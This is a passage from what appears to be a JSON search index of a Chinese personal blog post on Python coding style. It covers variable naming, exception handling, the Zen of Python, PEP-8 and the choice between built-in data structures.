\u7684\u5b8c\u7f8e\u547d\u540d\uff0c\u4f7f\u6bcf\u4e2a\u5bf9\u8c61\u7684\u540d\u5b57\u90fd\u6070\u5230\u597d\u5904\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u907f\u514d\u51fa\u73b0\u8ff7\u60d1\u547d\u540d\u3002\u4e00\u4e2a\u4e0d\u4f73\u7684\u547d\u540d\u53ef\u80fd\u4ec5\u4ec5\u4f1a\u7ed9\u9605\u8bfb\u4ee3\u7801\u5e26\u6765\u56f0\u96be\uff0c\u800c\u8ff7\u60d1\u547d\u540d\u5219\u4f1a\u4f7f\u6211\u4eec\u5b8c\u5168\u6df7\u6dc6\u4ee3\u7801\u7684\u542b\u4e49\u3002\u4ee5\u4e0b\u5217\u4e3e\u4e86\u4e00\u4e9b\u8ff7\u60d1\u547d\u540d\u7684\u4f8b\u5b50\uff1a \u6df7\u6dc6\u4f7f\u7528\u5143\u7d20\u5217\u8868\u547d\u540d Example for user in user_list : print ( user ) for user in users : print ( user ) user_list \u548c users \u90fd\u53ef\u4ee5\u8868\u793a\u4e00\u4e2a\u5b58\u50a8\u7528\u6237\u4fe1\u606f\u7684\u5217\u8868\u3002\u5047\u5982\u4e00\u4e2a\u8fc7\u7a0b\u5185\u540c\u65f6\u5b9a\u4e49\u4e86 user_list \u548c users \uff0c\u4f60\u4f1a\u600e\u6837\u53bb\u533a\u5206\u5462\uff1f\u6700\u597d\u7684\u65b9\u6cd5\u662f\u53ea\u4f7f\u7528\u5176\u4e2d\u7684\u4e00\u79cd\u547d\u540d\u65b9\u5f0f\uff0c\u800c\u6211\u9009\u62e9\u7684\u662f\u524d\u8005\uff08\u540e\u8005\u5f53\u7136\u4e5f\u884c\uff0c\u4f46\u8bf7\u4e0d\u8981\u6df7\u6dc6\u4f7f\u7528\uff01\uff09 \u6df7\u6dc6\u4f7f\u7528\u4e0b\u5212\u7ebf Example song_list : list [ Song ] = [] songlist : dict [ str , Any ] = {} \u4ee5\u4e0a\u5199\u6cd5\u975e\u5e38\u4ee4\u4eba\u8ff7\u60d1\uff0c song_list \u548c songlist \u53ef\u80fd\u90fd\u662f\u8868\u793a\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\u7684\u6b4c\u66f2\u5217\u8868\uff0c\u4f46\u662f\u8868\u793a\u8fd9\u4e2a \u201c\u5217\u8868\u201d \u7684\u6570\u636e\u7ed3\u6784\u5374\u662f\u4e0d\u540c\u7684\u3002\u5728\u540c\u4e00\u4e2a\u8fc7\u7a0b\u5185\u90e8\u540c\u65f6\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53d8\u91cf\u5c06\u4f1a\u4f7f\u5176\u4ed6\u5f00\u53d1\u8005\uff08\u751a\u81f3\u81ea\u5df1\uff01\uff09\u5728\u8c03\u7528\u5b83\u4eec\u65f6\u7f54\u77e5\u6240\u63aa\u3002 \u5f97\u4e8f\u8fd9\u662f\u6709 typing hint \u7684\u60c5\u51b5\uff0c\u8981\u662f\u9047\u5230\u4e00\u4e9b\u6ca1\u6709\u6807\u6ce8 typing hint \u8fd8\u8fd9\u6837\u5199\u7684\u4ee3\u7801\uff08 \u4f8b\u5982\u6211\u7684\u65e9\u671f\u4ee3\u7801 \uff09\uff0c\u90a3\u5c31\u771f\u7684\u8ba9\u4eba\u80cc\u5730\u91cc\u60f3\u9a82\u4eba\u4e86\u3002 \u53d8\u91cf\u540d\u52a0\u5165\u7d2f\u8d58\u7684\u524d/\u540e\u7f00 Example user : dict [ str , Any ] = {} user_data : dict [ str , Any ] = {} user_info : dict [ str , Any ] = {} user_detail : dict [ str , Any ] = {} user_metadata : dict [ str , Any ] = {} user_information : dict [ str , Any ] = {} \u8fd9\u79cd\u547d\u540d\u4f55\u6b62\u662f\u8ff7\u60d1\uff0c\u7b80\u76f4\u662f\u4ee4\u4eba\u607c\u706b\uff01\u5047\u5982\u4e00\u4e2a\u8fc7\u7a0b\u5185\u540c\u65f6\u5b9a\u4e49\u4e86 user \u3001 user_data \u3001 user_info \u3001 user_detail \u3001 user_metadata \u548c user_information \uff0c\u5982\u679c\u6211\u8981\u83b7\u53d6\u7528\u6237\u7684\u4fe1\u606f\uff0c\u8bf7\u95ee\u6211\u8be5\u8c03\u7528\u90a3\u4e2a\u53d8\u91cf\u5462\uff1f \u5efa\u8bae\u5728\u65b0\u7684\u53d8\u91cf\u547d\u540d\u4e4b\u524d\uff0c\u4ed4\u7ec6\u68c0\u67e5\u5df2\u7ecf\u547d\u540d\u8fc7\u7684\u53d8\u91cf\uff0c\u5982\u679c\u51fa\u73b0\u8fd9\u79cd\u591a\u4e2a\u4e0d\u540c\u540e\u7f00\u8868\u793a\u540c\u4e00\u6570\u636e\u7684\u60c5\u51b5\uff0c\u5219\u53ef\u80fd\u8bf4\u660e \u8fd9\u5df2\u7ecf\u4e0d\u662f\u7b80\u5355\u7684\u547d\u540d\u95ee\u9898\u4e86 \u3002 \u4e0d\u6070\u5f53\u7684\u7f29\u5199 Example Good: def get_classifier_K_nearest_neighbors ( dataset : Dataset , k : int ) -> Classifier : ... Bad: def get_classifier_KNN ( dataset : Dataset , k : int ) -> Classifier : ... KNN \u6307\u7684\u662f K-\u8fd1\u90bb\u7b97\u6cd5 \uff0c\u662f\u4e00\u79cd\u7528\u4e8e\u5206\u7c7b\u548c\u56de\u5f52\u7684\u975e\u53c2\u6570\u7edf\u8ba1\u65b9\u6cd5\uff0c\u501f\u7531\u8ba1\u7b97\u4e0e\u5df2\u77e5\u7c7b\u522b\u6848\u4f8b\u4e4b\u76f8\u4f3c\u5ea6\uff0c\u6765\u8bc4\u4f30\u672a\u77e5\u7c7b\u522b\u6848\u4f8b\u53ef\u80fd\u7684\u5206\u7c7b\u3002 \u4f7f\u7528\u7f29\u5199\u7684\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\uff0c\u4f46\u662f\u4e5f\u4f1a\u4f7f\u4ee3\u7801\u66f4\u52a0\u96be\u4ee5\u7406\u89e3\uff0c\u5c24\u5176\u662f\u4ee5\u4e0a\u8fd9\u79cd\u53ea\u6709\u5728\u4e13\u4e1a\u9886\u57df\u624d\u4f1a\u7528\u5230\u7684\u7f29\u5199\u3002 \u6df7\u6dc6\u4f7f\u7528\u81ea\u5b9a\u4e49\u5f02\u5e38\u7684\u540e\u7f00 Example class PotentialHiddenError ( RuntimeError ): ... class PotentialHiddenException ( RuntimeError ): ... \u5047\u8bbe\u4e00\u4e2a\u6708\u524d\u4f60\u5728 exceptions.py \u91cc\u5b9a\u4e49\u4e86\u8fd9\u4e24\u4e2a\u5f02\u5e38\uff0c\u4e00\u4e2a\u6708\u4e4b\u540e\u4f60\u9879\u76ee\u7684\u5176\u4ed6\u8d21\u732e\u8005\u5199\u4ee3\u7801\u7684\u65f6\u5019\u9700\u8981\u629b\u51fa\u4e00\u4e2a \u201c\u7528\u6237\u6f5c\u529b\u503c\u88ab\u9690\u85cf\u201d \u7684\u5f02\u5e38\uff0c\u8bf7\u95ee\u8be5\u629b\u51fa\u8c01\uff1f\u8fd9\u79cd\u8ff7\u60d1\uff08\u6df7\u6dc6\uff09\u60c5\u5f62\u548c\u5148\u524d\u63d0\u5230\u7684\u7b80\u76f4\u662f\u6b8a\u9014\u540c\u5f52\u3002 \u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 Python \u4e2d\uff0c\u66f4\u5e38\u7528\u7684\u5f02\u5e38\u7684\u540e\u7f00\u662f Error \uff0c\u800c\u4e0d\u662f Exception \u3002\uff08\u89c1\u5b98\u65b9\u6587\u6863\u4e2d\u7684 \u7528\u6237\u81ea\u5b9a\u4e49\u5f02\u5e38 \uff09 \u547d\u540d\u7684\u5177\u4f53\u5199\u6cd5\u5e76\u4e0d\u662f\u8be5\u8282\u7684\u8ba8\u8bba\u91cd\u70b9\uff0c\u9a7c\u5cf0\u547d\u540d\u6cd5\u3001\u4e0b\u5212\u7ebf\u547d\u540d\u6cd5\u548c\u5308\u7259\u5229\u547d\u540d\u6cd5\u7684\u5177\u4f53\u5185\u5bb9\u4e5f\u5df2\u4eba\u5c3d\u7686\u77e5\uff0c\u8fd9\u91cc\u4fbf\u4e0d\u518d\u8d58\u8ff0\u3002 \u5177\u4f53\u53ef\u4ee5\u53c2\u7167 Python \u4e4b\u7236 Guido \u63a8\u8350\u7684\u89c4\u8303\uff1a Type Public Internal Modules lower_with_under _lower_with_under Packages lower_with_under Classes CapWords _CapWords Exceptions CapWords Functions lower_with_under() _lower_with_under() Global/Class Constants CAPS_WITH_UNDER _CAPS_WITH_UNDER Global/Class Variables lower_with_under _lower_with_under Instance Variables lower_with_under _lower_with_under (protected) __lower_with_under (private) Method Names lower_with_under() _lower_with_under() (protected) __lower_with_under() (private) Function/Method Parameters lower_with_under Local Variables lower_with_under \u548c PEP-8 \u4e00\u6837\uff0c\u67d0\u4e9b IDE\uff08\u4f8b\u5982 PyCharm\uff09\u6216\u8005\u63d2\u4ef6\uff08\u4f8b\u5982 SonarLint\uff09\u4e5f\u53ef\u4ee5\u81ea\u52a8\u6807\u8bb0\u4f60\u4ee3\u7801\u4e2d\u4e0d\u9075\u5b88\u4e0a\u8ff0\u547d\u540d\u6cd5\u7684\u60c5\u51b5\u3002 4.2 \u907f\u514d\u8fc7\u957f\u7684\u51fd\u6570 \u00b6 \u5982\u679c\u4f60\u53d1\u73b0\u4e00\u4e2a\u51fd\u6570\u7684\u957f\u5ea6\u8d85\u8fc7\u4e8650\u884c\uff0c\u90a3\u4e48\u5927\u6982\u7387\u8bf4\u660e\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u7cbe\u7b80\u3002 TODO 4.3 \u907f\u514d\u6784\u9020\u91cd\u590d\u7684\u51fd\u6570 \u00b6 TODO 4.4 \u907f\u514d\u6ee5\u7528 try except \u8bed\u53e5 \u00b6 \u4e0d\u8981\u61d2\u60f0\u5230\u8ba9 try except \u8bed\u53e5\u6765\u5e2e\u4f60\u627e\u5230\u9519\u8bef\uff01 try except \u8bed\u53e5\u901a\u5e38\u662f\u7528\u4e8e\u5904\u7406\u9519\u8bef\u548c\u5f02\u5e38\u7684\uff0c\u4f46\u8fd9\u4e0d\u610f\u5473\u7740\u6240\u6709\u7684\u9519\u8bef\u548c\u5f02\u5e38\u90fd\u5fc5\u987b\u7ecf\u8fc7\u5b83\u7684\u624b\u5904\u7406\u3002\u5982\u679c\u662f\u4e00\u4e9b\u663e\u800c\u6613\u89c1\u7684\u9519\u8bef\uff0c\u5219\u5e94\u5f53\u907f\u514d\u4f7f\u7528 try except \u8bed\u53e5\uff0c\u800c\u662f\u76f4\u63a5\u6d88\u5316\u8fd9\u4e2a\u53ef\u80fd\u629b\u51fa\u7684\u5f02\u5e38\u3002 Example Good: def get_player_name ( play_record : dict [ str , Any ]) -> str : if play_record and 'name' in play_record [ 0 ]: return play_record [ 0 ][ 'name' ] else : return 'Unknown' Bad: def get_player_name ( play_record : dict [ str , Any ]) -> str : try : return play_record [ 0 ][ 'name' ] except ( KeyError , IndexError ): return 'Unknown' \u6b64\u4e3e\u662f\u4e3a\u4e86\u660e\u786e\u9519\u8bef\u7684\u539f\u56e0\u3002\u4ee5\u4e0a\u9762\u4e3a\u4f8b\uff0c\u5728\u5bf9\u4e00\u4e2a list \u6216 dict \u53cd\u590d\u4f7f\u7528 __getitem__ \u65f6\uff08\u4f8b\u5982\u6709\u4e9b\u6784\u9020\u590d\u6742\u7684 json \u53ef\u80fd\u4f1a\u5d4c\u5957\u597d\u51e0\u5c42\uff09\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4 KeyError \u548c IndexError \u7684\u9519\u8bef\u3002\u4f46\u662f\u7b80\u5355\u5730\u63a5\u4f4f\u9519\u8bef\u5e76\u4e0d\u80fd\u77e5\u9053\u5177\u4f53\u662f\u54ea\u4e2a\u5730\u65b9\u8c03\u7528 __getitem__ \u65b9\u6cd5\u65f6\u51fa\u9519\u4e86\uff0c\u662f\u4e00\u79cd\u6666\u6da9\u7684\u5904\u7406\u65b9\u6cd5\u3002 4.5 \u4e0d\u8981\u6d88\u5316\u81ea\u5df1\u4e0d\u8be5\u5904\u7406\u7684\u9519\u8bef \u00b6 \u4ec0\u4e48\u662f\u81ea\u5df1\u4e0d\u8be5\u5904\u7406\u7684\u9519\u8bef\uff1f \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u8bfb\u53d6\u4e00\u4e2a json \u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u4e00\u4e2a dict \u5bf9\u8c61\u3002 \u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff1a \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f \u5982\u679c\u6587\u4ef6\u5185\u5bb9\u4e0d\u662f\u4e00\u4e2a json \u5b57\u7b26\u4e32\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f \u4e00\u4e9b\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u8ba9\u8be5\u51fd\u6570\u9047\u5230\u9519\u8bef\u65f6\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u5178\uff0c\u6216\u8005\u8fd4\u56de None \u5bf9\u8c61\u3002\u6211\u4e2a\u4eba\u662f\u5f88\u4e0d\u8d5e\u540c\u8fd9\u4e2a\u505a\u6cd5\u7684\u3002 \u7b2c\u4e00\u4e2a\u95ee\u9898\u663e\u7136\u4e0d\u662f\u5b83\u9700\u8981\u5173\u5fc3\u7684\u4e8b\u60c5\uff0c\u56e0\u6b64\u5982\u679c\u9047\u5230\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\uff0c\u5b83\u539f\u5219\u4e0a\u5e94\u8be5\u7167\u5e38\u5411\u4e0a\u629b\u51fa FileNotFoundError \u5f02\u5e38\uff0c\u800c\u4e0d\u662f\u79c1\u81ea\u6d88\u5316\u6389\u8fd9\u4e2a\u5f02\u5e38\u3002 \u7b2c\u4e8c\u4e2a\u95ee\u9898\u663e\u7136\u624d\u662f\u5b83\u9700\u8981\u5173\u5fc3\u7684\u4e8b\uff0c\u4f46\u5904\u7406\u65b9\u5f0f\u4e5f\u7edd\u4e0d\u662f\u5f53\u4f5c\u6ca1\u6709\u9519\u8bef\u53d1\u751f\u5e76\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u5178\u6216\u662f None \u5bf9\u8c61\u3002\u6b63\u786e\u7684\u5904\u7406\u65b9\u5f0f\u4f9d\u7136\u662f\u5411\u4e0a\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u8fd9\u4e2a\u5f02\u5e38\u53ef\u4ee5\u662f RuntimeError \u6216\u662f\u7ee7\u627f\u81ea\u5b83\u7684\u81ea\u5b9a\u4e49\u5f02\u5e38\u3002 \u4e8b\u5b9e\u4e0a\uff0cPython \u6807\u51c6\u5e93\u4e2d\u7684 json \u5e93\uff08 json . load () \u51fd\u6570\uff09\u4fbf\u662f\u8fd9\u4e48\u505a\u7684\u3002 \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f \u4e0d\u53ef\u80fd\u5728 json . load () \u51fd\u6570\u4e2d\u89e6\u53d1\u8be5\u5f02\u5e38\uff0c\u56e0\u4e3a\u5b83\u5e76\u4e0d\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6\uff0c\u800c\u662f\u53ea\u4f7f\u7528\u4f20\u9012\u5230\u53c2\u6570\u7684\u6587\u4ef6\u6307\u9488\uff0c\u5373\u5b83\u7684\u7b2c\u4e00\u4e2a\u5f62\u53c2\uff1a fp : SupportsRead [ str | bytes ] \u3002 \u800c\u629b\u51fa FileNotFoundError \u5f02\u5e38\u7684\u51fd\u6570\u901a\u5e38\u662f\u6784\u9020\u6587\u4ef6\u6307\u9488\u7684\u51fd\u6570\uff0c\u5373 open () \u51fd\u6570\u3002 \u5982\u679c\u6587\u4ef6\u5185\u5bb9\u4e0d\u662f\u4e00\u4e2a json \u5b57\u7b26\u4e32\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f json . load () \u4f1a\u5411\u4e0a\u629b\u51fa json . decoder . JSONDecodeError \u5f02\u5e38\uff0c\u800c\u7edd\u4e0d\u662f\u79c1\u81ea\u6d88\u5316\u5b83\u3002 \u4e00\u4e2a\u79c1\u81ea\u6d88\u5316\u4e0d\u8be5\u5904\u7406\u7684\u5f02\u5e38\u7684\u51fd\u6570\uff0c\u5c31\u50cf\u662f\u4e00\u4e2a\u552f\u552f\u8bfa\u8bfa\u7684\u5c0f\u7537\u5b69\uff0c\u5f53\u53d7\u5230\u4e86\u6b3a\u8d1f\u7684\u65f6\u5019\uff0c\u88ab\u5bb6\u957f\u95ee\u8d77\u6765\u4e5f\u53ea\u662f\u4e00\u95ee\u4e09\u4e0d\u77e5\uff0c\u4e1d\u6beb\u4e0d\u900f\u9732\u81ea\u5df1\u53d1\u751f\u4e86\u4ec0\u4e48\u4e8b\u60c5\u3002 \u53ea\u6709\u5f53\u4f60\u5f88\u660e\u786e\u8fd9\u4e2a\u51fd\u6570\u8be5\u6d88\u5316\u8fd9\u4e2a\u5f02\u5e38\u7684\u65f6\u5019\uff0c\u624d\u53bb\u5904\u7406\u5b83\uff0c\u4e0d\u8be5\u6d88\u5316\u7684\u65f6\u5019\uff0c\u8bb0\u5f97\u76f4\u63a5\u5411\u4e0a\u629b\u51fa\uff01\u53ea\u6709\u8fd9\u6837\uff0cPython \u7684 traceback \u624d\u80fd\u66f4\u52a0\u6e05\u6670\u5730\u663e\u793a\u51fa\u9519\u7684\u539f\u56e0\u3002","title":"Python \u4e2a\u4eba\u4ee3\u7801\u98ce\u683c\u6307\u5bfc"},{"location":"blog/2022/220529-python-personal-styleguide/#_1","text":"","title":"\u4e00\u3001\u7eea\u8bba"},{"location":"blog/2022/220529-python-personal-styleguide/#11-python-import-this","text":"Python\u4e4b\u7985\u6700\u65e9\u7531 Tim Peters \u5728 Python \u90ae\u4ef6\u5217\u8868 \u4e2d\u53d1\u8868\uff0c\u5b83\u5305\u542b\u4e86\u5f71\u54cd Python \u7f16\u7a0b\u8bed\u8a00\u8bbe\u8ba1\u768419\u6761\u8f6f\u4ef6\u7f16\u5199\u539f\u5219\u3002 import this \u82f1\u6587\u7248 \ud83c\uddec\ud83c\udde7 \u4e2d\u6587\u7248 \ud83c\udde8\ud83c\uddf3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` linenums=\"1\" \u4f18\u7f8e\u4f18\u4e8e\u4e11\u964b \u660e\u4e86\u4f18\u4e8e\u9690\u6666 \u7b80\u5355\u4f18\u4e8e\u590d\u6742 \u590d\u6742\u4f18\u4e8e\u7e41\u6742 \u6241\u5e73\u4f18\u4e8e\u5d4c\u5957 \u7a00\u758f\u4f18\u4e8e\u7a20\u5bc6 \u53ef\u8bfb\u6027\u5f88\u91cd\u8981 \u7279\u4f8b\u4ea6\u4e0d\u53ef\u8fdd\u80cc\u539f\u5219 \u5373\u4f7f\u5b9e\u7528\u6bd4\u7eaf\u7cb9\u66f4\u4f18 \u9519\u8bef\u7edd\u4e0d\u80fd\u6084\u6084\u5ffd\u7565 \u9664\u975e\u5b83\u660e\u786e\u9700\u8981\u5982\u6b64 \u9762\u5bf9\u4e0d\u786e\u5b9a\u6027\uff0c\u62d2\u7edd\u5984\u52a0\u731c\u6d4b \u4efb\u4f55\u95ee\u9898\u5e94\u6709\u4e00\u79cd\uff0c\u4e14\u6700\u597d\u53ea\u6709\u4e00\u79cd\uff0c\u663e\u800c\u6613\u89c1\u7684\u89e3\u51b3\u65b9\u6cd5 \u5c3d\u7ba1\u8fd9\u65b9\u6cd5\u4e00\u5f00\u59cb\u5e76\u975e\u5982\u6b64\u76f4\u89c2\uff08\u9664\u975e\u4f60\u662f\u8377\u5170\u4eba\uff09 \u505a\u4f18\u4e8e\u4e0d\u505a \u7136\u800c\u4e0d\u5047\u601d\u7d22\u8fd8\u4e0d\u5982\u4e0d\u505a \u5f88\u96be\u89e3\u91ca\u7684\uff0c\u5fc5\u7136\u662f\u574f\u65b9\u6cd5 \u5f88\u597d\u89e3\u91ca\u7684\uff0c\u53ef\u80fd\u662f\u597d\u65b9\u6cd5 \u547d\u540d\u7a7a\u95f4\u662f\u4e2a\u7edd\u5999\u7684\u4e3b\u610f\uff0c\u6211\u4eec\u5e94\u597d\u597d\u5229\u7528\u5b83","title":"1.1 Python \u4e4b\u7985\uff1aimport this"},{"location":"blog/2022/220529-python-personal-styleguide/#12-pep-8","text":"PEP-8 \u5168\u79f0 PEP 8 \u2013 Style Guide for Python Code \uff0c\u5b83\u7ed9\u51fa\u4e86\u6784\u6210 Python \u4e3b\u53d1\u884c\u7248\u4e2d\u6807\u51c6\u5e93\u7684 Python \u4ee3\u7801\u7684\u7f16\u7801\u89c4\u8303\u3002 \u9075\u5b88 PEP-8 \u662f\u4e00\u4e2a\u5f88\u597d\u7684\u4e60\u60ef\uff0c\u5b83\u5e76\u4e0d\u662f\u4e00\u4e2a\u5fc5\u987b\u7684\u89c4\u8303\u3002\u7136\u800c\u6211\u81ea\u5df1\u7684\u5efa\u8bae\u662f\uff1a \u65e0\u8bba\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u90fd\u8bf7\u9075\u5b88 PEP-8 \u89c4\u8303 \u3002 PEP-8 \u53ef\u4ee5\u8ba9\u4f60\u7684\u4ee3\u7801\u770b\u8d77\u6765\u66f4\u89c4\u8303\uff0c\u66f4\u7b80\u6d01\uff0c\u66f4\u6613\u8bfb\u3002\u5c24\u5176\u662f\u7edf\u4e00\u7684\u683c\u5f0f\uff0c\u66f4\u5bb9\u6613\u88ab\u4eba\u9605\u8bfb\u3002 \u4e00\u4e9b IDE\uff08\u4f8b\u5982 PyCharm\uff09\u53ef\u4ee5\u81ea\u52a8\u6807\u8bb0\u4f60\u4ee3\u7801\u4e2d\u4e0d\u9075\u5b88 PEP-8 \u7684\u60c5\u51b5\u3002\u9664\u6b64\u4ee5\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6765\u68c0\u67e5\u4f60\u7684\u4ee3\u7801\u662f\u5426\u9075\u5b88\u4e86 PEP-8 \u89c4\u8303\uff1a python -m pep8 --statistics my_file.py \u4e60\u60ef\u6027\u9075\u5b88 PEP-8 \u53ef\u80fd\u4f1a\u8ba9\u60a8\u53d8\u6210 PEP-8 \u7684\u53d7\u5bb3\u8005\uff0c\u5bfc\u81f4\u60a8\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\u65f6\u4ecd\u7136\u4fdd\u7559\u4e86 PEP-8 \u4e2d\u7684\u4e60\u60ef\uff0c\u5c3d\u7ba1\u8fd9\u4e9b\u8bed\u8a00\u4e2d\u5e76\u6ca1\u6709\u7c7b\u4f3c\u7684\u8981\u6c42\u3002","title":"1.2 PEP-8"},{"location":"blog/2022/220529-python-personal-styleguide/#_2","text":"","title":"\u4e8c\u3001\u8be5\u4f7f\u7528\u4ec0\u4e48"},{"location":"blog/2022/220529-python-personal-styleguide/#21","text":"Python \u4e2d\u6709\u591a\u79cd\u5bf9\u8c61\u2014\u2014\u5217\u8868\u3001\u5b57\u5178\u3001\u96c6\u5408\u3001\u5143\u7ec4\u548c\u5b57\u7b26\u4e32\uff0c\u4ee5\u4e0b\u662f\u5bf9\u6bd4\uff1a \u5143\u7d20\u53ef\u91cd\u590d \u5143\u7d20\u53ef\u8ffd\u52a0 \u5bf9\u8c61\u53ef\u54c8\u5e0c \u5143\u7d20\u53ef\u7d22\u5f15 \u5217\u8868 \ud83d\udfe2 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \u5b57\u5178 \ud83d\udd34 \ud83d\udfe2 \ud83d\udd34 \ud83d\udd34 \u96c6\u5408 \ud83d\udd34 \ud83d\udfe2 \ud83d\udd34 \ud83d\udd34 \u5143\u7ec4 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \ud83d\udfe2 \u5b57\u7b26\u4e32 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \ud83d\udfe2 \u6ce8\uff1a \u5b57\u5178\u7684\u4e0d\u53ef\u91cd\u590d\u6307\u7684\u662f\uff0c\u5b57\u5178\u4e2d\u7684\u952e\u4e0d\u80fd\u91cd\u590d\u3002 \u662f\u5426\u53ef\u8ffd\u52a0\u7684\u6807\u51c6\u662f\uff0c\u9996\u5148\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u8ffd\u52a0\u65b0\u5143\u7d20\uff0c\u5176\u6b21\u5728\u8ffd\u52a0\u524d\u540e\uff0c\u4f7f\u7528 id () \u51fd\u6570\u8ba1\u7b97\u51fa\u7684\u6307\u9488\u662f\u5426\u4e00\u81f4\uff08\u5373\u662f\u5426\u4ecd\u4e3a\u540c\u4e00\u4e2a\u5bf9\u8c61\uff09\u3002 \u53ef\u4ee5\u4f7f\u7528 hash () \u51fd\u6570\u6216\u662f __hash__ () \u9b54\u6cd5\u65b9\u6cd5\u7684\u5bf9\u8c61\u89c6\u4e3a\u53ef\u54c8\u5e0c\u3002 \u7531\u4e8e\u6240\u6709\u7684\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u4e0a\u97625\u4e2a\u90fd\u662f\uff09\u90fd\u53ef\u4ee5\u4f7f\u7528 sorted () \u51fd\u6570\u8fdb\u884c\u6392\u5e8f\uff0c\u91c7\u7528\u8fd9\u4e2a\u6807\u51c6\u6765\u8fdb\u884c\u6bd4\u8f83\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u6240\u4ee5\u4e0d\u91c7\u7528\u5143\u7d20\u662f\u5426\u6709\u5e8f\u4f5c\u4e3a\u8fd95\u4e2a\u5bf9\u8c61\u7684\u5bf9\u6bd4\u9879\u76ee\u3002 \u5143\u7d20\u53ef\u7d22\u5f15\u6307\u7684\u662f\u5bf9\u8c61\u4e2d\u7684\u5143\u7d20\u662f\u5426\u53ef\u4ee5\u6309\u987a\u5e8f\u7d22\u5f15\uff08\u6216\u8005\u8bf4\u662f\u5426\u5177\u6709\u7c7b\u4f3c\u7ebf\u6027\u8868\u4e00\u6837\u7684\u5b58\u50a8\u7ed3\u6784\uff09\uff0c\u800c\u4e0d\u662f\u6307\u8be5\u5bf9\u8c61\u662f\u5426\u5177\u6709 __setitem__ () \u9b54\u6cd5\u65b9\u6cd5\u3002 \u9664\u5b57\u7b26\u4e32\u5916\uff0c\u5176\u4f594\u4e2a\u901a\u5e38\u7528\u4e8e\u8868\u793a\u4e00\u7ec4\u6570\u636e\uff08\u6216\u6620\u5c04\uff0c\u4f8b\u5982\u5b57\u5178\uff09\u3002\u4ee5\u4e0b\u662f\u6211\u603b\u7ed3\u7684 \u5728\u4ec0\u4e48\u65f6\u5019\u4f7f\u7528\u4ec0\u4e48\u6837\u7684\u6570\u636e\u7ed3\u6784 \uff1a \u5217\u8868\uff08 list \uff09-> \u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u7684\u6700\u4f73\u9009\u62e9 \u4f60\u7684\u6570\u636e\u662f\u6309\u987a\u5e8f\u7d22\u5f15\u7684\uff0c\u5e76\u4e14\u9700\u8981\u9891\u7e41\u5730\u4fee\u6539\u3001\u8ffd\u52a0\u3001\u5220\u9664\u3002\uff08\u6362\u53e5\u80fd\u542c\u61c2\u7684\u4eba\u8bdd\uff1a\u94fe\u8868\uff09 \u5b57\u5178\uff08 dict \uff09 \u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u7c7b\u4f3c\u54c8\u5e0c\u8868\uff08\u6563\u5217\u8868\uff09\u7684\u6570\u636e\u7ed3\u6784\u3002 \u96c6\u5408\uff08 set \uff09 \u4f60\u7684\u6570\u636e\u9700\u8981\u9891\u7e41\u5730\u8ffd\u52a0\u3001\u5220\u9664\uff0c\u5e76\u4e14\u4f60\u786e\u4fe1\u4f60\u53ef\u80fd\u4f1a\u8ffd\u52a0\u76f8\u540c\u7684\u6570\u636e\uff0c\u800c\u8fd9\u662f\u4f60\u60f3\u8981\u907f\u514d\u7684\u3002 \u5143\u7ec4\uff08 tuple \uff09 \u4f60\u7684\u6570\u636e\u53ea\u9700\u8981\u5b9a\u4e49\u4e00\u6b21\uff0c\u5e76\u4e14\u4ece\u4e0d\u4fee\u6539\u3001\u8ffd\u52a0\u3001\u5220\u9664\u3002\u6216\u8005\u5f53\u4f60\u7684\u6570\u636e\u603b\u662f\u7ec4\u961f\u51fa\u73b0\u65f6\uff08\u4f8b\u5982\u5750\u6807\u3001TCP\u56db\u5143\u7ec4\uff09\u3002 